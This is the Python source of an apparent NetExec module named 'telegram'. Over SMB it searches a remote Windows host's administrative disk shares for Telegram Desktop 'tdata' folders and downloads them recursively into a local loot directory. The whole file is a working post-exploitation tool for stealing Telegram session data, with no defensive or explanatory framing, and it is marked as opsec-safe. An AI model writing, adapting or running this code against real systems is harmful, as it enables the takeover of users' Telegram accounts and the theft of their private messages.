from __future__ import annotations

import os
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Sequence, Tuple

from impacket.smbconnection import SessionError

from nxc.helpers.misc import CATEGORY

EXCLUDE_SUBSTRINGS: Sequence[str] = [
    "Visual Studio",
    "Temp",
    "vmware-User",
    "VMWARE",
    "Drivers",
    "Microsoft",
    "packages",
    "Mozilla",
]


def _decode_share_name(raw: object) -> str:
    if isinstance(raw, bytes):
        raw_str = raw.decode("utf-8", errors="ignore")
    else:
        raw_str = str(raw or "")
    return raw_str.rstrip("\x00")


def _iter_disk_shares(shares: Iterable[Dict[str, object]]) -> List[str]:
    disk_shares: List[str] = []

    for share in shares:
        share_name_raw = share["shi1_netname"] 
        share_name = _decode_share_name(share_name_raw)

        if len(share_name) == 2 and share_name[0].isalpha() and share_name[1] == "$":
            disk_shares.append(share_name)

    return disk_shares


def _parse_search_dir(raw_value: Optional[str]) -> Tuple[Optional[str], Optional[str]]:
    if not raw_value:
        return None, None

    s = raw_value.strip()
    if not s:
        return None, None

    if len(s) == 1 and s[0].isalpha():
        drive = s[0].upper()
        return f"{drive}$", ""

    if len(s) == 2 and s[1] == ":" and s[0].isalpha():
        drive = s[0].upper()
        return f"{drive}$", ""

    match_drive_path = re.match(r"^([A-Za-z]):[\\/]*(.*)$", s)
    if match_drive_path:
        drive = match_drive_path.group(1).upper()
        rel = match_drive_path.group(2).replace("/", "\\")
        return f"{drive}$", rel

    match_share_path = re.match(r"^([A-Za-z]\$)[\\/]*(.*)$", s)
    if match_share_path:
        share = match_share_path.group(1).upper()
        rel = match_share_path.group(2).replace("/", "\\")
        return share, rel

    return None, None


def _is_excluded_path(path: str) -> bool:
    lower_path = path.lower()
    return any(substr.lower() in lower_path for substr in EXCLUDE_SUBSTRINGS)


def _find_tdata_in_share(
    smb_conn,
    share_name: str,
    start_path: str = "",
) -> List[str]:
    found_paths: List[str] = []

    def _walk(current_path: str) -> None:
        if _is_excluded_path(current_path):
            return

        search_path = f"{current_path}\\*" if current_path else "*"
        try:
            entries = smb_conn.listPath(share_name, search_path)
        except (SessionError, Exception):
            return

        for entry in entries:
            name = entry.get_longname()
            if name in [".", ".."] or not entry.is_directory():
                continue

            new_path = f"{current_path}\\{name}" if current_path else name

            if name.lower() == "tdata":
                found_paths.append(new_path)
                continue

            _walk(new_path)

    _walk(start_path or "")
    return found_paths


def _download_tree(
    smb_conn,
    logger,
    share_name: str,
    remote_base: str,
    local_base: Path,
) -> None:
    try:
        local_base.mkdir(parents=True, exist_ok=True)
    except Exception as exc:  
        logger.error(f"[!] Failed to create local directory {local_base}: {exc}")
        return

    search_path = f"{remote_base}\\*"
    try:
        entries = smb_conn.listPath(share_name, search_path)
    except SessionError as exc:
        logger.debug(f"[!] Failed to list {share_name}:{remote_base}: {exc}")
        return
    except Exception as exc:  
        logger.debug(f"[!] Unexpected error while listing {share_name}:{remote_base}: {exc}")
        return

    for entry in entries:
        name = entry.get_longname()
        if name in [".", ".."]:
            continue

        remote_child = f"{remote_base}\\{name}"
        local_child = local_base / name

        if entry.is_directory():
            _download_tree(smb_conn, logger, share_name, remote_child, local_child)
        else:
            try:
                with local_child.open("wb") as fout:
                    smb_conn.getFile(share_name, remote_child, fout.write)
            except Exception as exc: 
                logger.debug(f"[!] Failed to download {share_name}:{remote_child}: {exc}")


class NXCModule:
    name = "telegram"
    description = "Enumerate and loot Telegram Desktop tdata folders"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True
    category = CATEGORY.ENUMERATION

    def __init__(self, context=None, module_options=None) -> None:
        self.context = context
        self.module_options: Dict[str, str] = module_options or {}
        self.search_dir: Optional[str] = None

    def options(self, context, module_options) -> None:
        """
        SEARCH_DIR  Путь, с которого начинать приоритетный поиск tdata
                   (например, C:\\Users, D:\\, C:, D).
                   По умолчанию используется C:\\Users.
        """
        self.context = context
        self.module_options = module_options or {}
        self.search_dir = self.module_options.get("SEARCH_DIR")

    def on_login(self, context, connection) -> None:
        ip = connection.host
        log = context.log
        log.highlight(f"[*] Enumerating Telegram Desktop tdata on {ip}")

        smb = getattr(connection, "conn", None)
        if smb is None:
            log.error("[-] SMB connection object not available on this connection")
            return

        try:
            shares = smb.listShares()
        except Exception as exc:
            log.error(f"[!] Failed to list shares on {ip}: {exc}")
            return

        disk_shares = _iter_disk_shares(shares)

        if not disk_shares:
            log.error(f"[-] No disk shares (like C$, D$) found on {ip}")
            return

        raw_search_dir = self.search_dir or r"C:\Users"
        priority_share, priority_rel = _parse_search_dir(raw_search_dir)

        if priority_share and priority_share not in disk_shares:
            log.debug(
                f"[!] Priority search share {priority_share} not found among disk shares, "
                f"falling back to generic search",
            )
            priority_share = None
            priority_rel = None

        found_locations = []
        seen = set()

        if priority_share:
            log.highlight(f"[*] Priority searching for tdata from {raw_search_dir}")
            for rel_path in _find_tdata_in_share(smb, priority_share, priority_rel or ""):
                key = (priority_share, rel_path)
                if key not in seen:
                    seen.add(key)
                    found_locations.append(key)
        else:
            for share_name in disk_shares:
                log.debug(f"[*] Searching for tdata on share {share_name}")
                for rel_path in _find_tdata_in_share(smb, share_name, ""):
                    key = (share_name, rel_path)
                    if key not in seen:
                        seen.add(key)
                        found_locations.append(key)

        if not found_locations:
            log.error(f"[-] No Telegram tdata folders found for {ip}")
            return

        base_loot_dir = Path(os.getcwd()) / ".loot" / "telegram" / f"{ip}.tg"
        tdata_local_root = base_loot_dir / "tdata"

        try:
            tdata_local_root.mkdir(parents=True, exist_ok=True)
        except Exception as exc:  
            log.error(f"[!] Failed to create local loot directory {tdata_local_root}: {exc}")
            return

        full_paths = []
        for share_name, rel_path in found_locations:
            drive_letter = share_name[0]
            full_remote_path = f"{drive_letter}:\\{rel_path}"
            full_paths.append(full_remote_path)
            log.highlight(f"[+] Found Telegram tdata at {full_remote_path} on {ip}")

            safe_subdir = f"{share_name}_{rel_path.replace('\\', '_')}"
            local_root = tdata_local_root / safe_subdir
            _download_tree(smb, log, share_name, rel_path, local_root)

        info_path = base_loot_dir / "info.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            with info_path.open("w", encoding="utf-8") as f:
                f.write(f"time: {timestamp}\n")
                f.write("paths:\n")
                for p in full_paths:
                    f.write(f"  - {p}\n")
        except Exception as exc:  
            log.error(f"[!] Failed to write info file {info_path}: {exc}")
            return

        log.highlight(f"[+] Telegram tdata looted to {tdata_local_root}")